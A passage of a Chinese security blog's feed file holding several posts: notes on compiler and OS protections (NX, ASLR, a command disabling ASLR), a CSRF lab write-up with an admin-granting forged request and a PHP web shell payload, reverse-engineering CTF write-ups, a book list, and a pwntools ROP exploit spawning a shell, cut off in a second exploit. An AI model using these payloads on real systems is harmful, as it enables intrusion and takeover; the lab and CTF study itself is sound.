ret</span><br></pre></td></tr></table></figure><p>用包含参数-D_FORTIFY_SOURCE=2编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">08048470 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ; </span><br><span class="line">  mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">  sub    $0x118,%esp        ; </span><br><span class="line">  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存</span><br><span class="line">  mov    0x8(%ebp),%eax     ; </span><br><span class="line">  mov    %eax,0x4(%esp)     ; </span><br><span class="line">  lea    -0x108(%ebp),%eax  ; </span><br><span class="line">  mov    %eax,(%esp)        ; </span><br><span class="line">  call   8048370 &lt;__strcpy_chk@plt&gt;</span><br><span class="line"></span><br><span class="line">  leave                      ; </span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p><h2 id="四、NX（DEP）"><a href="#四、NX（DEP）" class="headerlink" title="四、NX（DEP）"></a>四、NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令</p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><h2 id="五、PIE（ASLR）"><a href="#五、PIE（ASLR）" class="headerlink" title="五、PIE（ASLR）"></a>五、PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。内存地址随机化机制（address space layout randomization)，有以下三种情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。<br>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。<br>liunx下关闭PIE的命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>单独关掉</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF初探</title>
      <link href="CSRF-Preliminary-Study.html"/>
      <url>CSRF-Preliminary-Study.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。</p><h2 id="与XSS的区别"><a href="#与XSS的区别" class="headerlink" title="与XSS的区别"></a>与XSS的区别</h2><p>虽然我不懂XSS，但是我大概还是知道一点XSS中的攻击流程，与XSS不同的是CSRF在攻击的时候，攻击代码是由管理员执行的。</p><p>整个CSRF攻击流程是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击</span><br></pre></td></tr></table></figure><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>在麦香师傅家，用麦香师傅的搭的环境，体验了一个傻逼管理员如何被攻击的过程。</p><p>首先，我们先获取了timekey，即时间戳，还有token。<br>经过精心的构造，我们可以构造，一个将自己的帐号添加到管理员组的攻击代码，在这个实验环境唯一的不足就是不知道如何获取自己的id numenber。<br><strong>构造的代码如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload/index.php?g=admin&amp;c=admin&amp;a=assign_admin_do&amp;admin_role_id=1&amp;a_ac_id%5B%5D=_all&amp;timeKey=1481717211&amp;token=a50d7be4&amp;member_id=5</span><br></pre></td></tr></table></figure><p>上述代码的作用是将指定的账户添加到管理员组。</p><p>当我们获取管理员权限之后，我们可以尝试getshell，这次我们依旧是可以通过CSRF，当管理员点击我们构造好的代码后，我们所写的一句话就被写入了。</p><p>这个实验有一个不足的地方就是，不知道一句话被写入的位置，其次好像因为是组件的原因，如果我们一次没写入成功，这个组件就坏掉了，并不能第二次写入。在今天晚上的实验过程中，并没能成功getsehll，不知道是不是代码的原因。<strong>我的代码如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/upload/index.php?g=admin&amp;c=template&amp;a=edit_template_file_do&amp;file=add_report.php&amp;description=添加报告&amp;content=&lt;script language=pHp&gt;<span class="variable">$a</span> = chr(<span class="string">&quot;97&quot;</span>).ssert;<span class="variable">$a</span>(<span class="variable">$_POST</span>[k]);&lt;/script&gt;&lt;&amp;timeKey=1481719767&amp;token=9d1547ba&amp;template=default&amp;dir=*home</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码是未经过url编码的，但是在实验的过程中，虽然一句话没写入，但是下面的代码却成功写入phpinfo了。<br><strong>phpinfo写入代码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload/index.php?g=admin&amp;c=template&amp;a=edit_template_file_do&amp;file=add_report.php&amp;description=%E6%B7%BB%E5%8A%A0%E6%8A%A5%E5%91%8A&amp;content=%3C%3Fphp+phpinfo%28%29%3F%3E%3C&amp;timeKey=1481717211&amp;token=a50d7be4&amp;template=default&amp;dir=*home</span><br></pre></td></tr></table></figure><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>CSRF最关键的是什么，就是人与人之间的博弈，关键是如何让管理员成功执行我们的攻击代码呢？这的确是一个值得思考的问题。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a><br><a href="http://www.freebuf.com/articles/web/55965.html">从零开始学CSRF</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ichunqiu百度杯-十一月reverse专题</title>
      <link href="ichuqiu-reverse-November.html"/>
      <url>ichuqiu-reverse-November.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Misc内容太简单不说了，直接进入正题</p><h2 id="CrackMe-1"><a href="#CrackMe-1" class="headerlink" title="CrackMe 1"></a>CrackMe 1</h2><p>第一个题目比较简单，  题目是直接通过取文本消息机制完成，所以我们只要找到关键的消息就好了</p><p>我们最终能找到一个叫DefWindowProcW的API，进去后我们会发现</p><p>![CrackMe][1]</p><p>  会发现之类有一个循环的异或以及文本绘制，后者是前者的结果。</p><p>  我们可以知道Chtext的大概内容</p><p>[Cmd-Markdown.exe](./_attachment/Cmd Markdown.exe)  ![此处输入图片的描述][2]</p><p>  但是在异或的过程中，我们并不知道v6的值，但是我们可以爆破，因为是单字节的异或这里好办，只要爆破后的结果有flag就是我们要的答案了。</p><h2 id="CrackMe2"><a href="#CrackMe2" class="headerlink" title="CrackMe2"></a>CrackMe2</h2><p>  第二题挺让人头大的，我一开始因为是简单的AES加解密，后来居然是个迷宫。。。都快吐血了。</p><p>  大概逻辑是这样的，我们直接在getdlgltemtextA下断点，之后发现程序逻辑是：<br>  先获取内容判断是否为空，然后以16进制的形式保存，然后进入到一个AES解密的地方<br>  ![AES][3]<br>  从图中我们可以看到AES的密钥是B1nGzL[4st-TeAm]</p><p>  AES解密之后又进行了一段base64的解码，然后舍去偶数位只取奇数，并且其Ascii码值不能大于83(S)<br>  之后是查表跳转，紧接着是还有的一大堆操作 先跳过<br> 到最后我们会发现一个迷宫，正确路径的选择是27S281S182S327S287S323Q124S281S1<br> 但是正是因为如果偶数为0x30是不进行循环的，是可能产生多解的。</p><h2 id="CrackMe3"><a href="#CrackMe3" class="headerlink" title="CrackMe3"></a>CrackMe3</h2><p> 第三个是个开关灯游戏，一直觉得和52破解的某个题目特别像，具体想不起来是哪个题目了。<br>​<br>这个题目也产生多解了，<br>先是计算常量b1ngzl的长度，然后再计算输入长度，然后将两个长度的值与4异或，<br>然后写入5<em>9</em>9个dword，进行了9*9 81个循环，每次循环按规则写入5个dword，产生了5个数组或者说矩阵？</p><p>就这样吧 反正这个题目多解比第二还多。。。。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-reverse-nov-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-reverse-nov-01.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqi-reverse-nov-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqi-reverse-nov-02.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-reverse-nov-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-reverse-nov-03.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> i春秋-百度杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届上海市大学生网络安全大赛 Re400</title>
      <link href="Second%20Shanghai%20college%20students%20&#39;%20network%20security%20competition.html"/>
      <url>Second%20Shanghai%20college%20students%20&#39;%20network%20security%20competition.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>用查找关键字符串的方法，很容易就找到了main函数<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-01.jpg"></a></p><p>程序逻辑很简单，就是check一下输入的函数，正确就Right错误，<br> 我们进入到<strong>sub_401510</strong>函数里面</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-02.jpg"></a></p><p>先是判断字符不能为非字母非数字<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-04.jpg"></a></p><p>再取输入的字符串的前5位为key 作DES的密钥<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-05.jpg"></a></p><p>之后再做base64编码<br>与最后main函数里的chekc比较</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddcff-oline-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddcff-oline-06.jpg"></a></p><p>所以我们可以做个暴力破解</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> 上海省赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016-SUCTF-PWN-Writeup</title>
      <link href="2016-SUCTF-Writeup-pwn.html"/>
      <url>2016-SUCTF-Writeup-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>题目我已经打包好了放在百度云<br><a href="http://pan.baidu.com/s/1pL6gMZh">链接</a></p><h1 id="这是你的hello-pwn"><a href="#这是你的hello-pwn" class="headerlink" title="这是你的hello pwn"></a>这是你的hello pwn</h1><p>这题是一个基础题，，只要绕过check，输入key - - ‘zhimakaimen’，就可以继续输入payload，然后覆盖到到关键函数</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-01.jpg"></a></p><p>就能得到flag了</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-02.jpg"></a></p><h1 id="再来一发"><a href="#再来一发" class="headerlink" title="再来一发"></a>再来一发</h1><p>这个题目比上个题目差在了一个地方，上个题目的getflag，是能直接getflag的，然而这个题目getflag是调用了system，这意味着我们可以在调用了system之后，可以在bss段写入/bin/sh起shell</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-03.jpg"></a></p><h1 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h1><p>我本来在这个题目卡住了来着，在joker师傅的教导下学习了一下mmap的函数的利用。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/25929931.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/25929931.jpg"></a><br>分析的时候发现这个程序是静态编译的，所以我们可以利用一下mmap函数。<br>mmap函数可以分出一段内存，这断内存的数据是可执行的，那么我们可以将shellcode写入这段内存，然后去getshell<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/7110208.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/7110208.jpg"></a></p><h1 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h1><p>这个题目的思路是通过DynELF去leak  system函数地址，然后我们通过写入/bin/sh起shell</p><p>这个题目只比pwn200多了一个leak  sysytem函数的步骤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = remote(&quot;106.75.84.74&quot;, 10001)#pwn</span></span><br><span class="line">r = remote(<span class="string">&quot;23.106.148.10&quot;</span>,<span class="number">20000</span>)<span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwnme&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">write_plt = <span class="number">0x00000000004004B0</span></span><br><span class="line">read_plt = <span class="number">0x00000000004004D0</span></span><br><span class="line">main = <span class="number">0x0000000004005F6</span></span><br><span class="line">bss = <span class="number">0x000000000600a70</span> + <span class="number">0x100</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006c3</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x00000000004006c1</span></span><br><span class="line"><span class="comment">#rdx === 0x100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;luck!\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x28</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)</span><br><span class="line">    payload += p64(pop_rsi_pop_r15_ret)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(<span class="number">0x6161616161616161</span>)</span><br><span class="line">    payload += p64(write_plt)</span><br><span class="line">    payload += p64(main)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    data = r.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./simple&#x27;</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] system addr:&#123;0&#125;&quot;</span>.format(hex(system_addr))</span><br><span class="line">r.recvuntil(<span class="string">&quot;luck!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(pop_rsi_pop_r15_ret)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">0x6161616161616161</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;luck!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> SUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>作为一个二进制安全学习者必知必读的书籍推荐</title>
      <link href="As-a-Software%20security%20engineer-must-know-and-read-books-recommended.html"/>
      <url>As-a-Software%20security%20engineer-must-know-and-read-books-recommended.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>莫名其妙接了一个整理二进制安全书籍的活，本来是<code>4ido10n </code>表哥在整理web安全相关的书籍，然后他找我要推荐，我莫名其妙给他了二进制安全的书。有点尴尬阿，于是乎，我就顺便做这件事情了<br>（抄袭一下）<br>至于书籍推荐这个话题，很多前辈都回答过了，但还是有很多刚入门的小伙伴还是一言不合就问改看书籍，作为一个还在学习的菜鸟忠恳告诉你，你第一本该看的书是《提问的智慧》，附上一个脑图：</p><h1 id="0x01-书籍"><a href="#0x01-书籍" class="headerlink" title="0x01 书籍"></a>0x01 书籍</h1><p><strong>学二进制如果没有拿的出的一手敲代码的能力怎么行？</strong><br>《window核心编程》<br>《C Primer Plus（第6版）中文版》<br>《C++ Primer Plus (第6版） 中文版》<br>《Python核心编程》<br> 《Python灰帽子-黑客与逆向工程的python编程之道》<br>《Python自动化运维：技术与最佳实践》<br>《精通黑客脚本》<br><strong>学二进制没有一点系统知识真的好嘛?</strong><br>《深入理解Linux内核》<br>《Linux内核源代码情景分析》<br>《Linux内核设计与实现》<br>《寒江独钓:windows内核安全编程》<br>《windows内核情景分析》<br>《windows内核原理与实现》<br>《UNIX操作系统设计》 -&gt; 《The Design of The UNIX Operating System》<br>《鸟哥的linux私房菜》<br><strong>学二进制不会一点技巧也不太好吧 **<br> 《reverse C++》<br>《c++反汇编与逆向分析技术揭秘<br>《格蠢汇编：软脚调试案例》<br>《黑客攻防技术宝典-系统实战篇》  人民邮电出版社<br>《0day安全：软件漏洞分析技术》 电子工业出版社<br>《漏洞战争-软件漏洞分析精要》  电子工业出版社<br>《逆向工程核心原理》人民邮电出版社<br>《加密与解密》<br>《IDA Pro权威指南》<br>《reverse engineering for beginners》<br>**拓展</strong><br>《游戏外挂开放艺术》<br>《捉虫日记》<br>《黑客免杀》<br>《恶意代码分析》<br>《安全软件开发之道》<br>《模糊测试-强制性安全漏洞发掘》<br>《灰帽黑客：正义黑客的道德规范、渗透测试、攻击方法和漏洞分析技术》</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>其实书还是很多的 我感觉还是适合自己 以及大众的书好 所以有些我没放上来，但是还是欢迎补充 谢谢。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ichunqiu百度杯-十一月pwn专题</title>
      <link href="ichuqiu-pwn-November.html"/>
      <url>ichuqiu-pwn-November.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h1><p>一个溢出题，考点在于怎么去leak出system地址然后去构造rop，最后去getshell，题目整体思路还是很清晰的关键我，我还不会leak</p><p>这个题目还有一个printf的格式化洞，还可以通过这个去写去起shell，不过这种方法比较不优雅<br>学习了学习了 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line">DEBUG = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;106.75.84.74&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># simplified r/s function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">delim</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(delim)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rn</span>(<span class="params">count</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvn(count)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ra</span>(<span class="params">count</span>):</span>      <span class="comment"># recv all</span></span><br><span class="line">    buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> count:</span><br><span class="line">        tmp = io.recvn(count)</span><br><span class="line">        buf += tmp</span><br><span class="line">        count -= len(tmp)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sn</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log.info(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span 